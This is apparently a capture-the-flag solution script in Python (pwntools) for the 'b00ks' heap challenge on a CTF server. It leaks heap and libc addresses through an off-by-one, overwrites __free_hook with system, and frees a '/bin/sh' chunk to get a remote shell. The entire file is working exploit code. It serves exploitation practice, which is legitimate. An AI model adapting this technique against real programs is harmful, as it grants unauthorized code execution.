#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/23 16:07:30
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = "amd64"
if debug:
    if context.arch == "amd64":
        # sh = process(["./b00ks"],env={'LD_PRELOAD':'../../libc_file/16-64-libc-2.23.so'})
        sh = process('./b00ks')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #libc = ELF("../../libc_file/16-64-libc-2.23.so")
        one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
    else:
        sh = process(["./b00ks"],env={'LD_PRELOAD':'../../libc_file/16-32-libc-2.23.so'})
        #sh = process("./")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc = ELF("../../libc_file/16-32-libc-2.23.so")
else:
    IP = 'node4.buuoj.cn'
    port = 26330
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
def debug():
    gdb.attach(sh)
    pause()

elf = ELF('b00ks')

def cmd(choice):
    sh.recvuntil("> ")
    sh.sendline(str(choice))

def add(size1,name,size2,description):
    cmd(1)
    sh.recvuntil("Enter book name size: ")
    sh.sendline(str(size1))
    sh.recvuntil("Enter book name (Max 32 chars): ")
    sh.send(name)
    sh.recvuntil("Enter book description size: ")
    sh.sendline(str(str(size2)))
    sh.recvuntil("Enter book description: ")
    sh.send(description)

def dele(idx):
    cmd(2)
    sh.recvuntil("Enter the book id you want to delete: ")
    sh.sendline(str(idx))

def edit(idx,description):
    cmd(3)
    sh.recvuntil("Enter the book id you want to edit: ")
    sh.sendline(str(idx))
    sh.recvuntil("Enter new book description: ")
    sh.send(description)

def show():
    cmd(4)

def edit_name(name):
    cmd(5)
    sh.recvuntil("Enter author name: ")
    sh.sendline(name)

sh.recvuntil("Enter author name: ")
sh.sendline("a"*0x20)
add(0x10,'a\n',0x10,'a\n') #1
show()
sh.recvuntil("a"*0x20)
heap_addr = u64(sh.recv(6).ljust(8,"\x00"))
log.info("heap_addr=>{}".format(hex(heap_addr)))
add(0x60,'aaaa\n',0x30,'aaaa\n') #2
dele(1)
add(0x20,'\n',0x20,'\n') #3
edit_name('a'*0x20)
add(0x80,'a\n',0x80,'a\n') #4
dele(4)
add(0x10,'/bin/sh\x00\n',0x10,'/bin/sh\x00\n')
add(0,'',0,'')
show()
libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3c4c88
log.info("libc_base=>{}".format(hex(libc_base)))
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
payload = p64(1) + p64(free_hook) + p64(free_hook) + p64(8) +"\n"
edit(2,payload)
edit(1,p64(system_addr))
dele(5)
sh.interactive()